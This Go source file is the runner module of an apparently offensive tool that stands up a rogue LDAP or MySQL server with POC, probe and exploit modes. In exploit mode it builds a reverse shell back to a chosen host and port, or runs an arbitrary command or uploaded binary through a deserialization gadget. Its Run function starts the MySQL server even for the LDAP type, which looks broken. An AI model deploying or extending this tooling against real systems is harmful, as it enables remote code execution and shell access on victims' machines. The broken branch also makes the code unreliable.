package runner

import (
	"fmt"
	"io/ioutil"
	"log"
	"strings"

	"github.com/cokeBeer/logi/pkg/payload"
	"github.com/cokeBeer/logi/pkg/server"
	"github.com/cokeBeer/logi/pkg/wordlist"
)

type Runner struct {
	s      *server.Server
	option *Option
}

func New(option *Option) *Runner {

	r := new(Runner)
	s := server.New(option.IP, option.Port)
	r.s = s

	s.Type = option.Type

	s.Mode = option.Mode

	if s.Type != server.TYPE_LDAP && s.Type != server.TYPE_MYSQL {
		fmt.Println(s.Type)
		log.Fatal("unsupported type, exit")
	}

	if s.Mode == -1 {
		log.Fatal("no mode provided, exit")
	}

	if s.Mode != server.MODE_POC && s.Mode != server.MODE_PROBE && s.Mode != server.MODE_EXPLOIT {
		log.Fatal("unsupported mode, exit")
	}

	if s.Mode == server.MODE_POC || s.Mode == server.MODE_PROBE {

		if option.Domain == "" {
			log.Fatal("no domain provided, exit")
		}
		s.Domain = option.Domain

	}

	if s.Mode == server.MODE_PROBE {

		if option.DictPath != "" {

			data, err := ioutil.ReadFile(option.DictPath)
			if err != nil {
				log.Fatal(err)
			}
			dict := strings.Split(string(data), "\n")

			wordlist.Manager.Set("custom", dict)
			s.Dict, _ = wordlist.Manager.Get("custom")

		} else {

			dict, ok := wordlist.Manager.Get(option.DictName)
			if !ok {
				log.Fatal("no wordlist provided, exit")
			}
			s.Dict = dict

		}
	}

	if s.Mode == server.MODE_EXPLOIT {

		if option.Binary != "" {

			// set custom payload
			s.Command = "unknown"

			data, err := ioutil.ReadFile(option.Binary)
			if err != nil {
				log.Fatal(err)
			}
			payload.IExecManager.SetCustom(data)

			gadget, ok := payload.IExecManager.GetCustom()
			if !ok {
				log.Fatal("no gadget provided, exit")
			}
			s.Gadget = gadget

		} else {

			// set command and gadget

			if option.Shell != "" {

				shell := strings.Split(option.Shell, ":")
				if len(shell) != 2 {
					log.Fatal("no command provided, exit")
				}

				host, port := shell[0], shell[1]
				s.Command = payload.ReverseShell(host, port)

			} else if option.Command != "" {
				s.Command = option.Command
			} else {
				log.Fatal("no command provided, exit")
			}

			if option.Gadget != "" {

				gadget, ok := payload.IExecManager.Get(option.Gadget)
				if !ok {
					log.Fatal("no gadget provided, exit")
				}
				s.Gadget = gadget

			} else {
				log.Fatal("no gadget provided, exit")
			}

		}
	}

	return r
}

func (r *Runner) Run() {

	if r.s.Type == server.TYPE_LDAP {

		r.s.StartMySQL()

	} else if r.s.Type == server.TYPE_MYSQL {

		r.s.StartMySQL()

	}

}
